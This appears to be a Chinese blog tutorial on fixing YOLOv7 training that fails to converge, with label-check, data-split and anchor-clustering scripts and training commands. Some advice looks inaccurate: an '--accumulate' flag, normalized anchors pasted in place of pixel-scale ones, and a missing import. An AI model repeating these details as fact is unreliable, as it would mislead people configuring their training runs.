<h3 data-id="heading-2">2.1 数据集问题（占比40%）：最容易踩的“基础坑”</h3>
<p>数据集是训练的基础，新手常犯的错误包括：</p>
<ul>
<li><strong>标注格式错误</strong>：YOLOv7要求标注格式为“class x_center y_center width height”（归一化后），但新手常出现“坐标未归一化”“坐标超出0-1范围”“类别编号不连续”（比如跳过0直接从1开始）“txt文件名与图片名不匹配”等问题；</li>
<li><strong>数据集分布失衡</strong>：目标数量过少（比如单类不足50张）、小目标占比过高（全部＜30×30px）、训练集与验证集分布差异大（比如训练集全是白天图，验证集全是夜晚图）；</li>
<li><strong>数据增强过度/不足</strong>：过度增强（比如随机裁剪比例过大、翻转角度过多）导致目标被破坏，模型学不到有效特征；或完全不做增强，数据量不足导致过拟合，间接表现为“伪不收敛”。</li>
</ul>
<h3 data-id="heading-3">2.2 超参数设置错误（占比30%）：新手最容易忽略的“关键坑”</h3>
<p>YOLOv7的超参数对训练收敛影响极大，新手常犯的错误有：</p>
<ul>
<li><strong>学习率不合理</strong>：学习率过高（比如直接用0.1，远超模型承受范围）导致Loss震荡不收敛；学习率过低（比如0.00001）导致Loss下降极慢，看似不收敛；</li>
<li><strong>batch_size设置不当</strong>：batch_size过大（超出GPU显存，导致梯度累积错误）或过小（比如≤2，梯度波动过大）；</li>
<li><strong>权重初始化错误</strong>：未使用官方预训练权重（从头训练难度极大，新手几乎不可能收敛），或预训练权重与自定义数据集类别数不匹配（比如用80类COCO预训练权重直接训练2类数据集，未修改输出层）。</li>
</ul>
<h3 data-id="heading-4">2.3 网络配置错误（占比15%）：代码层面的“隐形坑”</h3>
<p>新手修改YOLOv7配置文件时，容易出现“牵一发而动全身”的错误：</p>
<ul>
<li><strong>类别数配置错误</strong>：cfg配置文件中“nc”（number of classes）未改为自定义数据集的类别数，导致输出层维度与标签维度不匹配，Loss计算错误；</li>
<li><strong>锚框（anchor）不匹配</strong>：直接使用官方默认锚框，未根据自定义数据集的目标尺寸重新聚类，导致模型初始锚框与目标差异过大，难以学习；</li>
<li><strong>代码修改失误</strong>：修改损失函数、数据加载逻辑时出现语法错误或逻辑错误（比如标签读取顺序颠倒），导致训练流程异常。</li>
</ul>
<h3 data-id="heading-5">2.4 硬件与环境问题（占比10%）：容易被忽视的“基础保障坑”</h3>
<ul>
<li><strong>GPU显存不足</strong>：显存不足时会出现“RuntimeError: CUDA out of memory”，但部分情况下会“伪运行”，导致梯度更新失败，Loss不下降；</li>
<li><strong>环境依赖不匹配</strong>：PyTorch、CUDA、OpenCV等版本不兼容（比如YOLOv7推荐PyTorch1.7+、CUDA11.0+），导致训练过程中出现隐性错误。</li>
</ul>
<h3 data-id="heading-6">2.5 训练流程错误（占比5%）：操作层面的“低级坑”</h3>
<ul>
<li><strong>训练命令错误</strong>：未指定配置文件、数据集路径错误、权重文件路径错误，导致模型训练时读取不到正确的数据或权重；</li>
<li><strong>中断训练后恢复错误</strong>：中断训练后，未正确加载上次的权重文件，导致训练从头开始，或加载的权重与当前训练状态不匹配。</li>
</ul>
<h2 data-id="heading-7">三、实战解决方案：4步让YOLOv7稳定收敛</h2>
<p>下面按“从易到难、优先排查高频问题”的顺序，给出分步解决方案，每个步骤都有具体的实操代码和配置示例，新手可直接复用。</p>
<p>前置准备：下载官方YOLOv7源码（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWongKinYiu%2Fyolov7" target="_blank" title="https://github.com/WongKinYiu/yolov7" ref="nofollow noopener noreferrer">github.com/WongKinYiu/…</a>），配置基础环境（推荐：PyTorch1.10、CUDA11.3、OpenCV4.5+）。</p>
<h3 data-id="heading-8">3.1 第一步：数据集检查与预处理（优先排查）</h3>
<p>这是解决不收敛问题的第一步，也是最关键的一步，新手务必仔细操作：</p>
<h4 data-id="heading-9">3.1.1 标注格式校验（附代码）</h4>
<p>编写以下代码，批量检查标注文件是否符合要求（保存为check_annotation.py）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> glob

<span class="hljs-comment"># 配置数据集路径</span>
label_dir = <span class="hljs-string">"data/custom/labels/train"</span>  <span class="hljs-comment"># 训练集标签路径</span>
img_dir = <span class="hljs-string">"data/custom/images/train"</span>    <span class="hljs-comment"># 训练集图像路径</span>
nc = <span class="hljs-number">2</span>  <span class="hljs-comment"># 自定义数据集类别数（根据实际修改）</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_annotation</span>():
    <span class="hljs-comment"># 1. 检查标签文件与图像文件是否匹配</span>
    img_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(img_dir) <span class="hljs-keyword">if</span> f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))])
    label_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(label_dir) <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">'.txt'</span>)])
    mismatch = img_files - label_files
    <span class="hljs-keyword">if</span> mismatch:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"警告：以下图像无对应标签文件：<span class="hljs-subst">{mismatch}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># 2. 检查标注格式是否正确</span>
    label_paths = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> label_paths:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
            lines = f.readlines()
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                parts = line.strip().split()
                <span class="hljs-comment"># 检查每行是否有5个元素（class x y w h）</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">5</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中某行标注格式错误，应为'class x y w h'"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查类别编号是否合法</span>
                class_id = <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>])
                <span class="hljs-keyword">if</span> class_id&lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> class_id &gt;= nc:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中类别编号<span class="hljs-subst">{class_id}</span>超出范围（0~<span class="hljs-subst">{nc-<span class="hljs-number">1</span>}</span>）"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查坐标是否归一化（0~1）</span>
                coords = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">float</span>, parts[<span class="hljs-number">1</span>:]))
                <span class="hljs-keyword">for</span> coord <span class="hljs-keyword">in</span> coords:
                    <span class="hljs-keyword">if</span> coord &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> coord &gt; <span class="hljs-number">1</span>:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中坐标<span class="hljs-subst">{coord}</span>未归一化（应在0~1之间）"</span>)
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"标注格式检查通过！"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    check_annotation()
</code></pre>
<p>运行代码后，根据提示修复所有标注错误（比如补充缺失标签、修正坐标、调整类别编号）。</p>
<h4 data-id="heading-10">3.1.2 数据集增强与划分</h4>
<p>针对新手的“数据量不足”问题，推荐使用YOLOv7原生支持的数据增强策略，无需额外编写代码，只需在训练命令中启用即可：</p>
<ul>
<li>基础增强（必选）：随机翻转（flip）、随机裁剪（crop）、色域变换（hsv_h、hsv_s、hsv_v），YOLOv7默认启用，无需额外配置；</li>
<li>避免过度增强（新手建议）：不建议开启极端增强（比如random_perspective的degrees设置过大），默认参数即可；</li>
<li>数据集划分：按8:2比例划分训练集与验证集，确保两者分布一致（比如同一类别的目标在训练集和验证集中都有分布），可使用以下代码快速划分：</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">import os
import random
import shutil

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">src_img_dir</span> = <span class="hljs-string">"data/custom/all_images"</span>
<span class="hljs-attr">src_label_dir</span> = <span class="hljs-string">"data/custom/all_labels"</span>
<span class="hljs-attr">dst_train_img_dir</span> = <span class="hljs-string">"data/custom/images/train"</span>
<span class="hljs-attr">dst_train_label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>
<span class="hljs-attr">dst_val_img_dir</span> = <span class="hljs-string">"data/custom/images/val"</span>
<span class="hljs-attr">dst_val_label_dir</span> = <span class="hljs-string">"data/custom/labels/val"</span>
<span class="hljs-attr">val_ratio</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># 验证集比例</span>

<span class="hljs-comment"># 创建目标文件夹</span>
os.makedirs(dst_train_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_train_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 随机划分</span>
<span class="hljs-attr">img_files</span> = [f for f in os.listdir(src_img_dir) if f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))]
random.shuffle(img_files)
<span class="hljs-attr">val_num</span> = int(len(img_files) * val_ratio)
<span class="hljs-attr">val_files</span> = img_files[:val_num]
<span class="hljs-attr">train_files</span> = img_files[val_num:]

<span class="hljs-comment"># 复制训练集</span>
for f in train_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_train_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_train_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

<span class="hljs-comment"># 复制验证集</span>
for f in val_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_val_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_val_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

print(f"划分完成：训练集{len(train_files)}张，验证集{len(val_files)}张")
</code></pre>
<h3 data-id="heading-11">3.2 第二步：超参数与权重配置（核心优化）</h3>
<p>超参数和权重配置错误是新手训练不收敛的第二大原因，按以下配置修改，可大幅提升收敛概率：</p>
<h4 data-id="heading-12">3.2.1 学习率配置（新手推荐）</h4>
<p>YOLOv7官方推荐的学习率是基于batch_size=64的，新手需根据自己的GPU显存调整，遵循“batch_size减半，学习率减半”的原则：</p>
<ul>
<li>如果GPU显存足够（比如单卡24G）：使用默认学习率（lr0=0.01，lrf=0.01）；</li>
<li>如果batch_size=32（显存16G）：将lr0改为0.005；</li>
<li>如果batch_size=16（显存8G）：将lr0改为0.0025；</li>
<li>修改位置：在YOLOv7源码的“data/hyp.scratch.yaml”文件中，找到“lr0”参数修改。</li>
</ul>
<p>新手避坑：不要一开始就用太小的学习率（比如0.0001），会导致Loss下降极慢，误以为不收敛；也不要用太大的学习率（比如0.1），会导致Loss震荡。</p>
<h4 data-id="heading-13">3.2.2 batch_size与梯度累积配置</h4>
<p>如果GPU显存不足，无法设置较大的batch_size，可启用梯度累积（gradient accumulation），等价于增大batch_size：</p>
<ul>
<li>在训练命令中添加“--accumulate n”参数，n为累积步数，比如“--accumulate 2”，则batch_size=16等价于32；</li>
<li>示例：单卡8G显存，设置batch_size=8，accumulate=2，等价于batch_size=16，学习率设置为0.0025。</li>
</ul>
<h4 data-id="heading-14">3.2.3 预训练权重使用（必选）</h4>
<p>新手务必使用官方预训练权重，不要从头训练！步骤如下：</p>
<ol>
<li>下载官方预训练权重：从YOLOv7 GitHub主页下载“yolov7.pt”（基础版）或“yolov7-tiny.pt”（轻量化版，适合显存小的GPU）；</li>
<li>修改网络输出层：如果自定义数据集的类别数（nc）与预训练权重的类别数（80类）不一致，需修改配置文件中的“nc”，并确保输出层维度匹配；</li>
<li>训练时加载预训练权重：在训练命令中添加“--weights yolov7.pt”参数。</li>
</ol>
<h3 data-id="heading-15">3.3 第三步：网络配置修改（适配自定义数据集）</h3>
<p>网络配置错误会导致Loss计算异常，必须按以下步骤修改：</p>
<h4 data-id="heading-16">3.3.1 类别数（nc）修改</h4>
<p>复制官方配置文件“cfg/training/yolov7.yaml”，重命名为“yolov7-custom.yaml”，修改其中的“nc”参数为自定义数据集的类别数，比如2类：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># parameters</span>
<span class="hljs-attr">nc:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># number of classes（修改为自己的类别数）</span>
<span class="hljs-attr">depth_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># model depth multiple</span>
<span class="hljs-attr">width_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># layer channel multiple</span>

<span class="hljs-comment"># anchors（后续会优化，先保留默认）</span>
<span class="hljs-attr">anchors:</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">12</span>,<span class="hljs-number">16</span>, <span class="hljs-number">19</span>,<span class="hljs-number">36</span>, <span class="hljs-number">40</span>,<span class="hljs-number">28</span>]  <span class="hljs-comment"># P3/8</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">36</span>,<span class="hljs-number">75</span>, <span class="hljs-number">76</span>,<span class="hljs-number">55</span>, <span class="hljs-number">72</span>,<span class="hljs-number">146</span>]  <span class="hljs-comment"># P4/16</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">142</span>,<span class="hljs-number">110</span>, <span class="hljs-number">192</span>,<span class="hljs-number">243</span>, <span class="hljs-number">459</span>,<span class="hljs-number">401</span>]  <span class="hljs-comment"># P5/32</span>

<span class="hljs-comment"># 其他配置保持不变...</span>
</code></pre>
<h4 data-id="heading-17">3.3.2 锚框（anchor）聚类（可选但推荐）</h4>
<p>如果自定义数据集的目标尺寸与官方默认锚框差异较大，会导致模型难以学习，需重新聚类锚框：</p>
<ol>
<li>运行以下代码，对自定义数据集的目标尺寸聚类（保存为cluster_anchors.py）：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import glob
from sklearn.cluster import KMeans

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>
<span class="hljs-attr">num_anchors</span> = <span class="hljs-number">9</span>  <span class="hljs-comment"># YOLOv7需要9个锚框（3层×3个）</span>

def load_target_sizes(label_dir):
    <span class="hljs-attr">target_sizes</span> = []
    <span class="hljs-attr">label_paths</span> = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    for path in label_paths:
        with open(path, 'r') as f:
            <span class="hljs-attr">lines</span> = f.readlines()
            for line in lines:
                <span class="hljs-attr">parts</span> = line.strip().split()
                <span class="hljs-attr">w</span> = float(parts[<span class="hljs-number">3</span>])
                <span class="hljs-attr">h</span> = float(parts[<span class="hljs-number">4</span>])
                target_sizes.append(<span class="hljs-section">[w, h]</span>)
    return np.array(target_sizes)

def cluster_anchors(target_sizes, num_anchors):
    <span class="hljs-attr">kmeans</span> = KMeans(n_clusters=num_anchors, random_state=<span class="hljs-number">0</span>).fit(target_sizes)
    <span class="hljs-attr">anchors</span> = kmeans.cluster_centers_
    <span class="hljs-comment"># 按面积排序，分成3组（对应3个检测层）</span>
    <span class="hljs-attr">anchors</span> = sorted(anchors, key=lambda x: x[<span class="hljs-number">0</span>]*x[<span class="hljs-number">1</span>])
    <span class="hljs-attr">anchors</span> = np.array(anchors).reshape(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)
    return anchors

if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">target_sizes</span> = load_target_sizes(label_dir)
    <span class="hljs-attr">anchors</span> = cluster_anchors(target_sizes, num_anchors)
    print("聚类得到的锚框（按检测层分组）：")
    print(anchors)
    <span class="hljs-comment"># 示例输出（需替换到yolov7-custom.yaml中）：</span>
    <span class="hljs-comment"># [[[0.05, 0.08], [0.09, 0.12], [0.13, 0.18]],</span>
    <span class="hljs-comment">#  [[0.20, 0.25], [0.28, 0.35], [0.40, 0.45]],</span>
    <span class="hljs-comment">#  [[0.50, 0.60], [0.70, 0.80], [0.90, 1.00]]]</span>
</code></pre>
<ol>
<li>将聚类得到的锚框，替换“yolov7-custom.yaml”中的“anchors”参数。</li>
</ol>
<h3 data-id="heading-18">3.4 第四步：训练命令与监控（实操执行）</h3>
<p>完成以上配置后，执行训练命令，并实时监控训练状态，及时发现问题：</p>
<h4 data-id="heading-19">3.4.1 训练命令（新手推荐）</h4>
<p>根据自己的配置，修改以下命令中的路径和参数，在终端执行：</p>
<pre><code class="hljs language-css" lang="css"># 单卡训练（batch_size=<span class="hljs-number">16</span>，accumulate=<span class="hljs-number">2</span>，等价于<span class="hljs-number">32</span>）
python train<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--weights</span> yolov7<span class="hljs-selector-class">.pt</span> <span class="hljs-attr">--cfg</span> cfg/training/yolov7-custom<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--data</span> data/custom/data<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--epochs</span> <span class="hljs-number">100</span> <span class="hljs-attr">--batch-size</span> <span class="hljs-number">16</span> <span class="hljs-attr">--accumulate</span> <span class="hljs-number">2</span> <span class="hljs-attr">--device</span> <span class="hljs-number">0</span> <span class="hljs-attr">--name</span> yolov7_custom_train

# 参数说明：
# <span class="hljs-attr">--weights</span>：预训练权重路径
# <span class="hljs-attr">--cfg</span>：自定义网络配置文件路径
# <span class="hljs-attr">--data</span>：数据集配置文件路径（需提前创建，见下文）
# <span class="hljs-attr">--epochs</span>：训练轮数（新手推荐<span class="hljs-number">100</span>，足够观察收敛趋势）
# <span class="hljs-attr">--device</span> <span class="hljs-number">0</span>：使用第<span class="hljs-number">0</span>块GPU
# <span class="hljs-attr">--name</span>：训练日志保存名称
</code></pre>
<h4 data-id="heading-20">3.4.2 数据集配置文件（data.yaml）创建</h4>
<p>在“data/custom/”目录下创建“data.yaml”文件，内容如下（修改路径和类别名）：</p>
<pre><code class="hljs language-bash" lang="bash">train: ../custom/images/train  <span class="hljs-comment"># 训练集图像路径（相对路径）</span>
val: ../custom/images/val      <span class="hljs-comment"># 验证集图像路径</span>
nc: 2                          <span class="hljs-comment"># 类别数</span>
names: [<span class="hljs-string">'class1'</span>, <span class="hljs-string">'class2'</span>]    <span class="hljs-comment"># 类别名称（按类别编号顺序）</span>
</code></pre>
<h4 data-id="heading-21">3.4.3 训练过程监控（关键）</h4>
<p>训练过程中，实时观察以下指标，判断是否收敛：</p>
<ol>
<li><strong>Loss变化</strong>：前10个epoch，train_loss应快速下降（比如从10+降到2以下），如果前20个epoch Loss仍大于5，说明存在问题；</li>
<li><strong>精度变化</strong>：从第30个epoch开始，mAP50应逐步上升，若精度始终为0，需检查标签格式或网络配置；</li>
<li><strong>可视化监控</strong>：启用TensorBoard查看Loss和精度曲线，命令：tensorboard --logdir runs/train/yolov7_custom_train；</li>
<li><strong>中断恢复</strong>：如果训练中断，可通过“--resume”参数恢复训练，命令：python train.py --resume runs/train/yolov7_custom_train/weights/last.pt。</li>
</ol>
<h2 data-id="heading-22">四、实验验证：新手不收敛案例修复对比</h2>
<p>为了验证以上方案的有效性，以“新手常见的标注格式错误+学习率过高”导致的不收敛案例为例，展示修复前后的收敛效果：</p>
<h3 data-id="heading-23">4.1 案例背景</h3>
<ul>
<li>数据集：2类自定义数据集（汽车、行人），共1000张图像；</li>
<li>新手错误操作：标注坐标未归一化（直接使用像素值）、学习率使用0.1（batch_size=16）、未使用预训练权重；</li>
<li>错误现象：train_loss始终在15以上，精度为0，完全不收敛。</li>
</ul>
<h3 data-id="heading-24">4.2 修复方案</h3>
<ol>
<li>用3.1.1节的代码修复标注格式（将像素坐标归一化到0~1）；</li>
<li>将学习率改为0.0025（batch_size=16）；</li>
<li>加载官方yolov7.pt预训练权重。</li>
</ol>
<h3 data-id="heading-25">4.3 修复前后对比</h3>






























<table><thead><tr><th>指标</th><th>修复前（错误配置）</th><th>修复后（正确配置）</th></tr></thead><tbody><tr><td>50epoch train_loss</td><td>18.6</td><td>1.2</td></tr><tr><td>50epoch val_loss</td><td>17.8</td><td>1.5</td></tr><tr><td>50epoch mAP50</td><td>0</td><td>0.78</td></tr><tr><td>预测结果</td><td>全空，无任何框</td><td>能准确框出汽车和行人，置信度≥0.6</td></tr></tbody></table>
<p>从对比结果可以看出，修复后模型快速收敛，精度达到实用水平，验证了方案的有效性。</p>
<h2 data-id="heading-26">五、新手终极避坑指南：10个高频问题快速排查</h2>
<p>总结10个新手训练YOLOv7不收敛的高频问题，按“排查优先级”排序，遇到问题时可逐一对照：</p>
<ol>
<li>标注格式错误（坐标未归一化、类别编号错误、文件名不匹配）→ 用3.1.1节代码检查；</li>
<li>未使用预训练权重，从头训练→ 加载官方yolov7.pt；</li>
<li>学习率过高/过低→ 按batch_size调整lr0；</li>
<li>网络配置文件中nc未修改→ 确保nc等于自定义类别数；</li>
<li>数据集路径错误→ 检查data.yaml中的train/val路径；</li>
<li>GPU显存不足，导致梯度更新失败→ 减小batch_size，启用梯度累积；</li>
<li>锚框与目标尺寸不匹配→ 用3.3.2节代码重新聚类锚框；</li>
<li>数据增强过度，目标被破坏→ 关闭极端增强，使用默认增强参数；</li>
<li>环境依赖不匹配→ 按官方推荐配置PyTorch、CUDA版本；</li>
<li>训练命令参数错误（比如--cfg路径错误）→ 重新检查命令参数。</li>
</ol>
<h2 data-id="heading-27">六、总结：新手训练收敛的核心逻辑</h2>
<p>新手训练YOLOv7不收敛，本质上是“基础配置错误”和“核心参数不当”导致的，并非模型本身难训练。掌握以下核心逻辑，就能轻松解决问题：</p>
<p><strong>1. 基础优先</strong>：先确保数据集标注正确、路径配置无误，这是收敛的前提；</p>
<p><strong>2. 借力预训练</strong>：一定要使用官方预训练权重，避免从头训练，降低收敛难度；</p>
<p><strong>3. 超参适配</strong>：学习率和batch_size要匹配自己的硬件环境，不要盲目使用默认值；</p>
<p><strong>4. 实时监控</strong>：训练过程中及时观察Loss和精度变化，早发现问题早修复。</p>
<p>按照本文的步骤操作，新手也能让YOLOv7模型稳定收敛。如果在实操过程中遇到具体问题，欢迎在评论区留言交流，我会一一解答。</p>
<p>最后，本文所有实操代码均已整理完毕，关注我后私信“YOLOv7收敛”即可获取完整代码包，无加密、无套路。如果觉得这篇文章对你有帮助，欢迎点赞、收藏、转发，你的支持是我持续输出实战技术文的最大动力。</p>
<p>技术之路，从新手到高手，只差“踩坑-复盘-解决”的循环。共勉。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从数据集标注到模型评估：YOLO完整工作流实战（附避坑清单）]]></title>    <link>https://juejin.cn/post/7594874733383680051</link>    <guid>https://juejin.cn/post/7594874733383680051</guid>    <pubDate>2026-01-14T07:38:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594874733383680051" data-draft-id="7594859060858454026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 从数据集标注到模型评估：YOLO完整工作流实战（附避坑清单）"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T07:38:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员威哥"/> <meta itemprop="url" content="https://juejin.cn/user/3411107130652176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             从数据集标注到模型评估：YOLO完整工作流实战（附避坑清单）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411107130652176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员威哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:38:50.000Z" title="Wed Jan 14 2026 07:38:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 